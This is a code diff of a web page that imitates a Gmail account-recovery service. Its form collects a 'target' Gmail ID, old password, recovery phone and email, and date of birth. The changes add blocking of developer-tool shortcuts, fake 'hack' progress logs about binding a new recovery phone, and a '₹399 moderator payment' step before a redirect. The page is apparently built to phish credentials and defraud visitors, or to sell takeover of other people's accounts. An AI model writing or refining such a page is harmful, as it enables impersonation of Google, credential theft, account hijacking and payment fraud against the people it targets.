@@ -46,7 +46,6 @@
             opacity: 0.35;
             animation: float 20s infinite ease-in-out alternate;
         }
-        /* Google Colors: Blue, Red, Yellow, Green */
         .orb-1 {
             width: 400px; height: 400px; background: #4285F4; 
             top: -5%; left: -5%; animation-duration: 25s;
@@ -71,7 +70,7 @@
             100% { transform: translate(50px, 50px) scale(1.05); }
         }
 
-        /* Container */
+        /* Container & Glass Panel */
         .container {
             width: 100%;
             max-width: 550px;
@@ -86,7 +85,6 @@
             transform: scale(1);
         }
 
-        /* Apple Liquid Glass Panel */
         .glass-panel {
             background: rgba(25, 27, 33, 0.4);
             backdrop-filter: blur(30px);
@@ -113,7 +111,6 @@
             padding: 10px !important;
         }
 
-        /* Shake Animation */
         @keyframes shakeError {
             0%, 100% { transform: translate3d(0, 0, 0); }
             10%, 30%, 50%, 70%, 90% { transform: translate3d(-8px, 0, 0); }
@@ -130,30 +127,11 @@
             margin-bottom: 30px;
         }
 
-        /* Glowing Slide Text Animation */
-        .shiny-title-wrapper {
+        /* Removed shiny slide animation from title wrapper */
+        .title-wrapper {
             position: relative;
             display: inline-block;
-            overflow: hidden; 
             padding: 5px 15px;
-            border-radius: 10px;
-        }
-
-        .shiny-title-wrapper::before {
-            content: ''; 
-            position: absolute; 
-            top: 0; left: -100%; width: 50%; height: 100%;
-            background: linear-gradient(to right, transparent, rgba(255,255,255,0.7), transparent);
-            transform: skewX(-25deg); 
-            animation: slideLight 3.5s infinite linear;
-            pointer-events: none;
-            z-index: 5;
-            mix-blend-mode: overlay; 
-        }
-
-        @keyframes slideLight { 
-            0% { left: -100%; } 
-            100% { left: 200%; } 
         }
 
         h1 {
@@ -166,11 +144,6 @@
             position: relative;
             z-index: 2;
         }
-
-        .text-blue { color: #4285F4; text-shadow: 0 0 10px rgba(66, 133, 244, 0.5); }
-        .text-red { color: #EA4335; text-shadow: 0 0 10px rgba(234, 67, 53, 0.5); }
-        .text-yellow { color: #FBBC05; text-shadow: 0 0 10px rgba(251, 188, 5, 0.5); }
-        .text-green { color: #34A853; text-shadow: 0 0 10px rgba(52, 168, 83, 0.5); }
 
         /* Form Elements */
         .form-group {
@@ -194,6 +167,14 @@
             font-size: 1.1rem;
         }
 
+        .optional-text {
+            font-size: 0.75rem;
+            color: #8ab4f8; /* Light blueish grey for distinction */
+            font-weight: 500;
+            margin-left: 4px;
+            font-style: italic;
+        }
+
         input {
             width: 100%;
             padding: 15px 18px;
@@ -205,6 +186,17 @@
             transition: all 0.3s ease;
             outline: none;
             box-shadow: inset 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        /* Special CSS to make Date Calendar Icon Visible */
+        input[type="date"]::-webkit-calendar-picker-indicator {
+            filter: invert(1); /* Makes the black calendar icon white */
+            cursor: pointer;
+            opacity: 0.8;
+            transition: 0.2s;
+        }
+        input[type="date"]::-webkit-calendar-picker-indicator:hover {
+            opacity: 1;
         }
 
         input:focus { 
@@ -261,7 +253,6 @@
             display: none;
         }
 
-        /* Green Glowing Proceed Button */
         .btn-submit {
             background: linear-gradient(135deg, #34A853, #227c3a);
             color: #fff;
@@ -318,8 +309,9 @@
             color: #34A853 !important; 
             text-shadow: 0 0 12px #34A853 !important;
             transform: scaleY(1.8) translateZ(0) !important;
-            filter: blur(1px) !important; 
-            opacity: 0.8 !important;
+            /* Increased Blur heavily as requested */
+            filter: blur(2.8px) !important; 
+            opacity: 0.55 !important;
             margin-bottom: 2px !important;
             line-height: 1.1;
             word-wrap: break-word;
@@ -355,11 +347,12 @@
             50% { opacity: 0; }
         }
 
-        /* Multicolored Glow Text for Normal Processing Phase */
+        /* Normal Processing Phase Colors */
         .c-sys { color: #4285F4; text-shadow: 0 0 10px rgba(66, 133, 244, 0.8); }
         .c-data { color: #FBBC05; text-shadow: 0 0 10px rgba(251, 188, 5, 0.8); }
         .c-succ { color: #34A853; text-shadow: 0 0 10px rgba(52, 168, 83, 0.8); }
         .c-err { color: #EA4335; text-shadow: 0 0 10px rgba(234, 67, 53, 0.8); }
+        .c-billing { color: #ffcc00; text-shadow: 0 0 15px rgba(255, 204, 0, 0.9); font-size: 1.15rem; }
 
         /* INTRO MAGNETIC SPLASH SCREEN */
         .intro-overlay {
@@ -382,8 +375,7 @@
         .char {
             font-family: 'Montserrat', sans-serif; 
             font-size: 3rem; font-weight: 900;
-            color: #fff; text-transform: uppercase;
-            text-shadow: 0 0 15px rgba(255, 255, 255, 0.8); 
+            text-transform: uppercase;
             display: inline-block; opacity: 0;
             will-change: transform, opacity;
         }
@@ -474,50 +466,47 @@
             
             <div id="formSection">
                 <header>
-                    <div class="shiny-title-wrapper">
+                    <div class="title-wrapper" id="mainHeaderTitle">
                         <h1>
-                            <span class="text-blue">G</span><span class="text-red">M</span><span class="text-yellow">A</span><span class="text-blue">I</span><span class="text-green">L</span>
-                            <br>
-                            ACCOUNT RECOVERY
-                        </h1>
+                            </h1>
                     </div>
                 </header>
                 
                 <form id="recoveryForm" novalidate>
                     
                     <div class="form-group" style="z-index: 100;">
-                        <label>First Gmail ID <span class="mandatory">*</span></label>
-                        <input type="email" id="firstGmail" placeholder="Enter target Gmail ID">
-                        <div class="error-msg" id="firstGmailError">Please enter a valid target Gmail ID.</div>
+                        <label>Gmail ID <span class="mandatory">*</span></label>
+                        <input type="email" id="firstGmail" placeholder="Enter your email ID">
+                        <div class="error-msg" id="firstGmailError">Please enter a valid Gmail ID.</div>
                     </div>
 
                     <div class="form-group" style="z-index: 90;">
-                        <label>Full Name (Optional)</label>
+                        <label>Full Name <span class="optional-text">(Optional)</span></label>
                         <input type="text" id="fullName" placeholder="Enter your full name">
                     </div>
 
                     <div class="form-group" style="z-index: 80;">
-                        <label>Old Password (Optional)</label>
+                        <label>Old Password <span class="optional-text">(Optional)</span></label>
                         <input type="text" id="oldPassword" placeholder="Enter last remembered password">
                     </div>
 
                     <div class="form-group" style="z-index: 70;">
-                        <label>Recovery Phone Number (Optional)</label>
+                        <label>Recovery Phone Number <span class="optional-text">(Optional)</span></label>
                         <input type="tel" id="oldPhone" placeholder="Old recovery phone number">
                     </div>
 
                     <div class="form-group" style="z-index: 60;">
-                        <label>Recover Email ID (Optional)</label>
+                        <label>Recover Email ID <span class="optional-text">(Optional)</span></label>
                         <input type="email" id="oldRecoverEmail" placeholder="Old recovery email ID">
                     </div>
 
                     <div class="form-group" style="z-index: 50;">
-                        <label>Date of Birth (Optional)</label>
+                        <label>Date of Birth <span class="optional-text">(Optional)</span></label>
                         <input type="date" id="dob" style="color-scheme: dark;">
                     </div>
 
                     <div class="form-group" style="z-index: 40;">
-                        <label>Operating System <span class="mandatory">*</span></label>
+                        <label>Device Operating System <span class="mandatory">*</span></label>
                         <div class="custom-select-wrapper" id="osWrapper" data-value="">
                             <div class="custom-select-trigger"><span style="color: #c4c6ca;">Select Operating System</span> <i class="fa-solid fa-chevron-down"></i></div>
                             <ul class="custom-select-options">
@@ -531,8 +520,14 @@
                         <div class="error-msg" id="osError">Please select your device operating system.</div>
                     </div>
 
+                    <div class="form-group" id="otherOsGroup" style="display: none; z-index: 35;">
+                        <label>Describe Your Device <span class="mandatory">*</span></label>
+                        <input type="text" id="otherOsDesc" placeholder="E.g., Samsung Galaxy S23, Custom ROM...">
+                        <div class="error-msg" id="otherOsError">Please describe your device.</div>
+                    </div>
+
                     <div class="form-group" style="z-index: 30;">
-                        <label>Add New Recover Email ID (Optional)</label>
+                        <label>Add New Recover Email ID <span class="optional-text">(Optional)</span></label>
                         <input type="email" id="newRecoverEmail" placeholder="Enter new recovery email">
                     </div>
 
@@ -543,7 +538,7 @@
                     </div>
 
                     <div class="form-group" style="z-index: 10;">
-                        <label>Contact Email (Optional)</label>
+                        <label>Contact Email <span class="optional-text">(Optional)</span></label>
                         <input type="email" id="contactEmail" placeholder="Email to contact you">
                     </div>
 
@@ -569,6 +564,37 @@
                 if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) return false;
                 if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
             }
+
+            const colors = ['#4285F4', '#EA4335', '#FBBC05', '#34A853']; // Google colors
+
+            // Set Individual Glowing letters for Main Page Header
+            function setHeaderGlow() {
+                const headerText1 = "GMAIL";
+                const headerText2 = "ACCOUNT RECOVERY";
+                const h1Element = document.querySelector('#mainHeaderTitle h1');
+                
+                let htmlContent = "";
+                headerText1.split('').forEach((char, idx) => {
+                    const color = colors[idx % colors.length];
+                    // Applying text color and exactly same color's deep glow
+                    htmlContent += `<span style="color: ${color}; text-shadow: 0 0 15px ${color}, 0 0 35px ${color};">${char}</span>`;
+                });
+                htmlContent += "<br>";
+                
+                let colorIndex = 0;
+                headerText2.split('').forEach((char) => {
+                    if(char === ' ') {
+                        htmlContent += " ";
+                    } else {
+                        const color = colors[colorIndex % colors.length];
+                        htmlContent += `<span style="color: ${color}; text-shadow: 0 0 15px ${color}, 0 0 35px ${color};">${char}</span>`;
+                        colorIndex++;
+                    }
+                });
+                
+                h1Element.innerHTML = htmlContent;
+            }
+            setHeaderGlow();
 
             const introOverlay = document.getElementById('introOverlay');
             const introMagneticText = document.getElementById('introMagneticText');
@@ -598,8 +624,6 @@
                 const charElements = [];
                 const words = text.split(' ');
 
-                const colors = ['#4285F4', '#EA4335', '#FBBC05', '#34A853']; // Google colors
-
                 words.forEach((word, wordIndex) => {
                     const wordDiv = document.createElement('div');
                     wordDiv.style.display = 'inline-block';
@@ -609,7 +633,9 @@
                         const span = document.createElement('span');
                         span.innerText = char;
                         span.className = 'char';
-                        span.style.color = colors[idx % colors.length]; // Apply random-ish google color
+                        const color = colors[idx % colors.length];
+                        span.style.color = color;
+                        span.style.textShadow = `0 0 15px ${color}, 0 0 30px ${color}`;
                         
                         const rx = (Math.random() - 0.5) * 3000;
                         const ry = (Math.random() - 0.5) * 3000;
@@ -699,6 +725,17 @@
                         textSpan.style.color = '#fff';
                         wrapper.setAttribute('data-value', value);
                         
+                        // Show "Other" description field if needed
+                        if (wrapper.id === 'osWrapper') {
+                            const otherOsGroup = document.getElementById('otherOsGroup');
+                            if (value === 'Other') {
+                                otherOsGroup.style.display = 'block';
+                            } else {
+                                otherOsGroup.style.display = 'none';
+                                document.getElementById('otherOsDesc').value = '';
+                            }
+                        }
+
                         options.forEach(o => o.classList.remove('selected'));
                         this.classList.add('selected');
                         wrapper.classList.remove('open');
@@ -719,6 +756,7 @@
                 const firstGmail = document.getElementById('firstGmail');
                 const osWrap = document.getElementById('osWrapper');
                 const newPhone = document.getElementById('newPhone');
+                const otherOsDesc = document.getElementById('otherOsDesc');
 
                 const validateInput = (element, condition) => {
                     if(condition) {
@@ -741,7 +779,12 @@
                 // Validate Mandatory Fields
                 validateInput(firstGmail, !emailRegex.test(firstGmail.value));
                 validateDropdown(osWrap);
-                validateInput(newPhone, newPhone.value.length < 5); // Basic check
+                validateInput(newPhone, newPhone.value.length < 5); 
+                
+                // If Other OS is selected, ensure it's described
+                if (osWrap.getAttribute('data-value') === 'Other') {
+                    validateInput(otherOsDesc, otherOsDesc.value.trim() === '');
+                }
 
                 if (!isValid) {
                     glassPanel.classList.remove('shake');
@@ -750,7 +793,12 @@
                     return; 
                 }
 
-                // Gather all data (Optional included)
+                let finalOsValue = osWrap.getAttribute('data-value');
+                if (finalOsValue === 'Other') {
+                    finalOsValue = otherOsDesc.value;
+                }
+
+                // Gather all data
                 const formData = {
                     firstGmail: firstGmail.value,
                     fullName: document.getElementById('fullName').value || 'Not Provided',
@@ -758,7 +806,7 @@
                     oldPhone: document.getElementById('oldPhone').value || 'Not Provided',
                     oldRecoverEmail: document.getElementById('oldRecoverEmail').value || 'Not Provided',
                     dob: document.getElementById('dob').value || 'Not Provided',
-                    os: osWrap.getAttribute('data-value'),
+                    os: finalOsValue,
                     newRecoverEmail: document.getElementById('newRecoverEmail').value || 'Not Provided',
                     newPhone: newPhone.value,
                     contactEmail: document.getElementById('contactEmail').value || 'Not Provided'
@@ -800,15 +848,12 @@
                 const realLogs = [
                     `<span class="c-sys">[System]</span> Initiating Recovery Environment...`,
                     `<span class="c-data">[Info]</span> Target Email: ${data.firstGmail}`,
-                    `<span class="c-data">[Info]</span> Full Name Input: ${data.fullName}`,
-                    `<span class="c-data">[Info]</span> Target OS: ${data.os}`,
-                    `<span class="c-sys">[Scan]</span> Processing Old Password History... (${data.oldPassword})`,
-                    `<span class="c-sys">[Scan]</span> Locating Old Recovery Phone... (${data.oldPhone})`,
-                    `<span class="c-succ">[Execute]</span> Injecting New Recovery Email: ${data.newRecoverEmail}`,
-                    `<span class="c-succ">[Execute]</span> Injecting New Recovery Phone: ${data.newPhone}`,
-                    `<span class="c-data">[Log]</span> Setting Contact Email to: ${data.contactEmail}`,
+                    `<span class="c-data">[Info]</span> Target Device/OS: ${data.os}`,
+                    `<span class="c-sys">[Scan]</span> Processing Old Details & Password...`,
+                    `<span class="c-succ">[Execute]</span> Binding New Recovery Phone: ${data.newPhone}`,
                     `<span class="c-succ">[Success]</span> Parameters Compiled Successfully!`,
-                    `<span class="c-sys">Please wait... Forwarding request.</span>`
+                    `<span class="c-billing">[Billing] Moderator payment charges: ₹399</span>`,
+                    `<span class="c-sys">Please wait... Forwarding to payment gateway.</span>`
                 ];
 
                 let startTimestamp = null;
@@ -834,6 +879,7 @@
                     
                     processLog.scrollTop = processLog.scrollHeight;
 
+                    // Let fast hack lines run for 2.5 seconds
                     if (progress < 2500) { 
                         reqAnimId = requestAnimationFrame(fastPhase);
                     } else {
@@ -876,14 +922,14 @@
                                 }
                             }, 10); 
                         } else {
-                            setTimeout(triggerRocketIllusion, 500);
+                            setTimeout(triggerRocketIllusion, 600);
                         }
                     }
                     typeNextLine();
                 }
             }
 
-            // --- 5. ROCKET ILLUSION ANIMATION ---
+            // --- 5. ROCKET ILLUSION & REDIRECT ---
             function triggerRocketIllusion() {
                 rocketOverlay.style.display = 'flex';
                 
@@ -894,8 +940,8 @@
                         telegramPlane.classList.add('fly-out');
                         
                         setTimeout(() => {
-                            // Rocket fly out hone ke baad ka action yaha hoga
-                            alert("Process Completed Successfully!");
+                            // REDIRECT TO REQUESTED URL
+                            window.location.href = "https://youtu.be/6ZkIWcec7vY?si=CizjCWdHX8gvF16z";
                         }, 400); 
                     }, 1000); 
                 }, 50);
